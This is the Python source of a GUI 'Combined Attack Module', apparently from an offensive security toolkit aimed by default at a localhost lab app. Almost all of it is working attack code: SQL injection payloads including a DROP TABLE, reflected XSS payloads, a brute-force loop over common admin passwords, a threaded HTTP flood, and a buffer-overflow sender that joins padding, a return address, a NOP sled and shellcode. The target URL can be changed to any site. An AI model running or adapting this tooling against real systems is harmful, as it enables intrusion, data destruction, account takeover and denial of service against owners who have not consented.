import tkinter as tk
from tkinter import ttk
import threading
import socket
import requests
import time
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from modules.scan_supply_chain import SupplyChainScanner
from modules.buffer_overflow import BoFScanner, BoFPayloads


class CombinedModule(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent, bg="#1e1e1e")
        self.pack(fill="both", expand=True)
        
        ttk.Label(self, text="Combined Attack Module", font=("Arial", 14, "bold")).pack(pady=10)
        
        config_frame = tk.Frame(self, bg="#1e1e1e")
        config_frame.pack(fill="x", padx=20, pady=5)
        
        ttk.Label(config_frame, text="Target URL:").pack(side="left")
        self.target_url = ttk.Entry(config_frame, width=40)
        self.target_url.insert(0, "http://localhost:3000")
        self.target_url.pack(side="left", padx=5)
        
        self.module_vars = {}
        modules_frame = tk.Frame(self, bg="#1e1e1e")
        modules_frame.pack(fill="x", padx=20, pady=10)
        
        runnable_modules = [
            ("Port Scanner", "port_scanner", True),
            ("Supply Chain Scan", "supply_chain", True),
            ("XSS Injection", "xss", True),
            ("SQL Injection", "sql_injection", True),
            ("Buffer Overflow", "buffer_overflow", True),
            ("Brute Force", "bruteforce", True),
            ("HTTP Flood", "http_flood", True)
        ]
        
        for i, (label, key, default) in enumerate(runnable_modules):
            frame = tk.Frame(modules_frame, bg="#1e1e1e")
            frame.grid(row=i//4, column=i%4, padx=10, pady=5, sticky="w")
            var = tk.BooleanVar(value=default)
            self.module_vars[key] = var
            chk = ttk.Checkbutton(frame, text=label, variable=var)
            chk.pack(anchor="w")
        
        button_frame = tk.Frame(self, bg="#1e1e1e")
        button_frame.pack(pady=10)
        
        ttk.Button(button_frame, text="Run Selected Modules", command=self.run_modules).pack(side="left", padx=5)
        ttk.Button(button_frame, text="Stop", command=self.stop).pack(side="left", padx=5)
        ttk.Button(button_frame, text="Clear Output", command=self.clear_output).pack(side="left", padx=5)
        
        self.output = tk.Text(self, bg="#252526", fg="white", height=20)
        self.output.pack(fill="both", expand=True, padx=20, pady=10)
        
        self.running = False
    
    def log(self, msg, module=""):
        if module:
            self.output.insert("end", f"[{module}] {msg}\n")
        else:
            self.output.insert("end", f"{msg}\n")
        self.output.see("end")
    
    def run_modules(self):
        selected = [k for k, v in self.module_vars.items() if v.get()]
        if not selected:
            self.log("[!] No modules selected")
            return
        
        target = self.target_url.get().strip()
        if not target:
            self.log("[!] Please enter a target URL")
            return
        
        self.running = True
        self.log(f"[*] Starting combined attack on {target}")
        self.log(f"[*] Modules: {', '.join(selected)}")
        self.log("=" * 60)
        
        threading.Thread(target=self._execute_modules, args=(selected, target), daemon=True).start()
    
    def stop(self):
        self.running = False
        self.log("[*] Stopping...")
    
    def clear_output(self):
        self.output.delete("1.0", tk.END)
    
    def _execute_modules(self, modules, target):
        for module_key in modules:
            if not self.running:
                break
            
            self.log(f"\n[*] --- {module_key.upper()} ---")
            
            try:
                if module_key == "port_scanner":
                    self._run_port_scanner(target)
                elif module_key == "supply_chain":
                    self._run_supply_chain(target)
                elif module_key == "xss":
                    self._run_xss(target)
                elif module_key == "sql_injection":
                    self._run_sql_injection(target)
                elif module_key == "buffer_overflow":
                    self._run_buffer_overflow(target)
                elif module_key == "bruteforce":
                    self._run_bruteforce(target)
                elif module_key == "http_flood":
                    self._run_http_flood(target)
            except Exception as e:
                self.log(f"[!] Error in {module_key}: {e}")
        
        self.log("\n[*] All selected modules completed")
    
    def _run_port_scanner(self, target):
        host = "localhost"
        ports = [3000, 80, 8080, 443, 8000, 5000]
        self.log(f"Scanning {host}...", "port_scanner")
        
        for port in ports:
            if not self.running:
                break
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((host, port))
                if result == 0:
                    self.log(f"[+] Port {port} is OPEN", "port_scanner")
                sock.close()
            except:
                pass
        
        self.log("[+] Port scan completed", "port_scanner")
    
    def _run_sql_injection(self, target):
        self.log("Testing SQL injection on /search endpoint...", "sql_injection")
        
        search_url = f"{target}/search"
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL,NULL,NULL--",
            "'; DROP TABLE products--",
            "' AND 1=2 UNION SELECT 1,2,3,4--"
        ]
        
        for payload in sql_payloads:
            if not self.running:
                break
            
            try:
                response = requests.post(search_url, data={"searched": payload}, timeout=3)
                
                if "SQL Error" in response.text:
                    self.log(f"[+] SQL Error triggered with: {payload[:30]}...", "sql_injection")
                elif "No results found" not in response.text and response.status_code == 200:
                    self.log(f"[+] Potential SQLi with payload: {payload[:30]}...", "sql_injection")
                
            except Exception as e:
                self.log(f"[!] Request failed: {e}", "sql_injection")
        
        self.log("[+] SQL injection tests completed", "sql_injection")
    
    def _run_xss(self, target):
        self.log("Testing XSS injection...", "xss")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>"
        ]
        
        test_endpoints = [
            (f"{target}/search", "POST", "searched"),
            (f"{target}/login", "GET", "username")
        ]
        
        for url, method, param in test_endpoints:
            if not self.running:
                break
            
            self.log(f"[*] Testing {url}...", "xss")
            
            for payload in xss_payloads:
                if not self.running:
                    break
                
                try:
                    if method == "POST":
                        response = requests.post(url, data={param: payload}, timeout=3)
                    else:
                        response = requests.get(f"{url}?{param}={payload}", timeout=3)
                    
                    if payload in response.text:
                        self.log(f"[!] XSS REFLECTED at {url} with: {payload[:30]}...", "xss")
                    
                except:
                    pass
        
        self.log("[+] XSS tests completed", "xss")
    
    def _run_bruteforce(self, target):
        self.log("Testing brute force on /login...", "bruteforce")
        
        login_url = f"{target}/login"
        common_passwords = [
            "admin", "password", "123456", "admin123", "password123",
            "root", "test", "qwerty", "letmein", "admin1"
        ]
        
        self.log(f"[*] Testing {len(common_passwords)} passwords", "bruteforce")
        
        for password in common_passwords:
            if not self.running:
                break
            
            try:
                response = requests.get(login_url, params={
                    "username": "admin",
                    "password": password
                }, timeout=2)
                
                if "Login successful" in response.text or "Welcome" in response.text:
                    self.log(f"[+] SUCCESS! Password found: {password}", "bruteforce")
                    break
                elif response.status_code == 200:
                    self.log(f"[*] Tried: {password}", "bruteforce")
                
            except Exception as e:
                self.log(f"[!] Request failed: {e}", "bruteforce")
        
        self.log("[+] Brute force test completed", "bruteforce")
    
    def _run_http_flood(self, target):
        self.log("Starting HTTP flood test...", "http_flood")
        
        num_requests = 50
        threads = 10
        
        self.log(f"[*] Sending {num_requests} requests with {threads} threads", "http_flood")
        
        def send_requests(start_id, count):
            for i in range(count):
                if not self.running:
                    break
                
                req_id = start_id + i
                try:
                    start = time.time()
                    response = requests.get(target, timeout=5)
                    elapsed = time.time() - start
                    
                    if req_id % 10 == 0:
                        self.log(f"[*] Request #{req_id}: {response.status_code} ({elapsed:.2f}s)", "http_flood")
                    
                except Exception as e:
                    if req_id % 10 == 0:
                        self.log(f"[!] Request #{req_id} failed: {str(e)[:30]}", "http_flood")
        
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            requests_per_thread = num_requests // threads
            
            for i in range(threads):
                start_id = i * requests_per_thread
                futures.append(executor.submit(send_requests, start_id, requests_per_thread))
            
            for future in concurrent.futures.as_completed(futures):
                future.result()
        
        self.log("[+] HTTP flood test completed", "http_flood")
    
    def _run_supply_chain(self, target):
        self.log("Starting supply chain scan...", "supply_chain")
        
        scanner = SupplyChainScanner(self.log)
        scanner.scan_url(target)
        
        self.log("[+] Supply chain scan completed", "supply_chain")
    
    def _run_buffer_overflow(self, target):
        self.log("Starting buffer overflow attack...", "buffer_overflow")
        
        scanner = BoFScanner(self.log)
        scanner.stop_event = threading.Event()
        
        common_params = ["search", "query", "username", "data", "input"]
        profiles = BoFPayloads.get_profiles()
        
        self.log(f"[*] Testing {len(common_params)} parameters with {len(profiles)} architecture profiles", "buffer_overflow")
        self.log(f"[*] Parameters: {', '.join(common_params)}", "buffer_overflow")
        
        for param in common_params:
            if not self.running:
                break
            
            self.log(f"\n[*] Testing parameter: {param}", "buffer_overflow")
            
            for profile in profiles:
                if not self.running:
                    break
                
                self.log(f"[*] Testing profile: {profile.name}", "buffer_overflow")
                
                offsets = [64, 264, 512, 1024]
                
                for offset in offsets:
                    if not self.running:
                        break
                    
                    padding = b'A' * offset
                    full_payload = padding + profile.return_addr + profile.nop_sled + profile.shellcode
                    payload_str = full_payload.decode('latin-1')
                    
                    try:
                        start = time.time()
                        response = requests.post(target, data={param: payload_str}, timeout=5)
                        duration = time.time() - start
                        
                        if response.status_code >= 500:
                            self.log(f"[+] 500 ERROR! Potential crash with offset {offset}", "buffer_overflow")
                        elif duration > 3.0:
                            self.log(f"[!] Slow response ({duration:.2f}s) - potential vulnerability", "buffer_overflow")
                        
                    except Exception as e:
                        self.log(f"[+] Connection died! Server likely crashed with {profile.name}", "buffer_overflow")
                        break
                
                time.sleep(0.2)
        
        self.log("[+] Buffer overflow test completed", "buffer_overflow")
